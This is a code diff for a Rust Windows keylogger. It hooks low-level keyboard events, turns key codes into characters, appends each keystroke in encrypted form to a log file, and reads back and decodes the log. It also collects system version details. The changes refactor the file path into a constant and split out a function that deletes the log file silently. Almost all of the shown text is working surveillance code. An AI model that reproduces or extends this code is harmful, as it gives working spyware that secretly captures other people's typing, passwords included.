@@ -4,7 +4,6 @@ use std::sync::Mutex;
 use once_cell::sync::Lazy;
 use std::io::Write;
 use crate::encode::{self, Encode};
-use base64::{engine::general_purpose, Engine as _};
 
 use windows::Win32::Foundation::{
     HWND, LPARAM, LRESULT, WPARAM
@@ -48,11 +47,12 @@ use windows::Win32::UI::WindowsAndMessaging::{
 
 use windows::Win32::UI::Input::KeyboardAndMouse::{
 
-    GetKeyState, GetKeyboardState, MapVirtualKeyA, MapVirtualKeyW, ToUnicode, MAPVK_VK_TO_VSC, VK_CAPITAL, VK_SHIFT
+    GetKeyState, GetKeyboardState, MapVirtualKeyW, ToUnicode, MAPVK_VK_TO_VSC, VK_CAPITAL, VK_SHIFT
 };
 
 // creates a global encoder
 static ENCODER: Lazy<Mutex<encode::Encode>> = Lazy::new(|| Mutex::new(Encode::new(52)));
+const KEYLOGGING_FILE: & str = "keyLogging.txt";
 
 pub fn get_windows_version() -> &'static str{
     let mut system_info = SYSTEM_INFO::default();
@@ -92,20 +92,24 @@ fn get_system_arch(arch: PROCESSOR_ARCHITECTURE) ->  &'static str {
 }
 
 pub unsafe fn set_windows_hook(){
-    let hook = SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_callback), None, 0).unwrap();
 
-    println!("Hook is now listenting");
+    unsafe{
 
-    let mut msg = MSG::default();
+        let hook = SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_callback), None, 0).unwrap();
 
-        // This keeps the thread alive to receive hook messages
-    while GetMessageW(&mut msg, Some(HWND(std::ptr::null_mut())), 0, 0).as_bool() {
-        TranslateMessage(&msg);
-        DispatchMessageW(&msg);
+        println!("Hook is now listenting");
+
+        let mut msg = MSG::default();
+
+            // This keeps the thread alive to receive hook messages
+        while GetMessageW(&mut msg, Some(HWND(std::ptr::null_mut())), 0, 0).as_bool() {
+            TranslateMessage(&msg);
+            DispatchMessageW(&msg);
+        }
+
+
+        UnhookWindowsHookEx(hook);
     }
-
-
-    UnhookWindowsHookEx(hook);
 }
 
 unsafe extern "system" fn keyboard_callback(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT{
@@ -142,30 +146,35 @@ unsafe extern "system" fn keyboard_callback(code: i32, wparam: WPARAM, lparam: L
 
 unsafe fn vk_code_to_char(vk_code:u32) -> Option<char>{
 
-    let mut keyboard_state = [0u8;256];
+    unsafe{
 
-    GetKeyboardState(&mut keyboard_state);
+        
+        let mut keyboard_state = [0u8;256];
 
-        // Simulate Caps Lock toggle
-    let caps = GetKeyState(VK_CAPITAL.0 as i32) & 0x0001;
-    if caps != 0 {
-        keyboard_state[VK_CAPITAL.0 as usize] |= 0x01;
+        GetKeyboardState(&mut keyboard_state);
+
+            // Simulate Caps Lock toggle
+        let caps = GetKeyState(VK_CAPITAL.0 as i32) & 0x0001;
+        if caps != 0 {
+            keyboard_state[VK_CAPITAL.0 as usize] |= 0x01;
+        }
+
+        // Simulate Shift pressed
+        let shift = GetKeyState(VK_SHIFT.0 as i32);
+        if (shift as u16) & 0x8000 != 0 {
+            keyboard_state[VK_SHIFT.0 as usize] |= 0x80;
+        }
+
+        let mut char_buf = [0u16; 2];
+
+        let scan_code = MapVirtualKeyW(vk_code, MAPVK_VK_TO_VSC);
+
+        let result = ToUnicode(vk_code, scan_code, Some(& keyboard_state),& mut char_buf, 0);
+        
+        
+        char::from_u32(char_buf[0] as u32)
+
     }
-
-    // Simulate Shift pressed
-    let shift = GetKeyState(VK_SHIFT.0 as i32);
-    if (shift as u16) & 0x8000 != 0 {
-        keyboard_state[VK_SHIFT.0 as usize] |= 0x80;
-    }
-
-    let mut char_buf = [0u16; 2];
-
-    let scan_code = MapVirtualKeyW(vk_code, MAPVK_VK_TO_VSC);
-
-    let result = ToUnicode(vk_code, scan_code, Some(& keyboard_state),& mut char_buf, 0);
-    
-
-    char::from_u32(char_buf[0] as u32)
 }
 
 
@@ -175,7 +184,7 @@ fn write_into_file(button_pressed:& str){
     let mut data_file = OpenOptions::new()
     .create(true)
     .append(true).
-    open("keyLogging.txt").expect("Cannot open file");
+    open(KEYLOGGING_FILE).expect("Cannot open file");
     
     let enc = enc.encrypt(button_pressed);
     writeln!(data_file, "{}", &enc).expect("msg");
@@ -190,10 +199,10 @@ pub fn read_file() -> String{
     OpenOptions::new()
         .create(true) // ← ensures the file exists
         .append(true) // ← opens without truncating
-        .open("keyLogging.txt")
+        .open(KEYLOGGING_FILE)
         .expect("Failed to create or open file");
 
-    let read = fs::read_to_string("keyLogging.txt")
+    let read = fs::read_to_string(KEYLOGGING_FILE)
     .expect("can't read into file");
 
     let mut decode_string = String::new();
@@ -206,7 +215,17 @@ pub fn read_file() -> String{
 
     dec.reset_key();
 
-    fs::remove_file("keyLogging.txt");
-
     decode_string
+}
+
+pub fn delete_file(){
+
+    match fs::remove_file(KEYLOGGING_FILE){
+        Ok(_) => {
+
+        },
+        Err(_) => {
+
+        }
+    };
 }
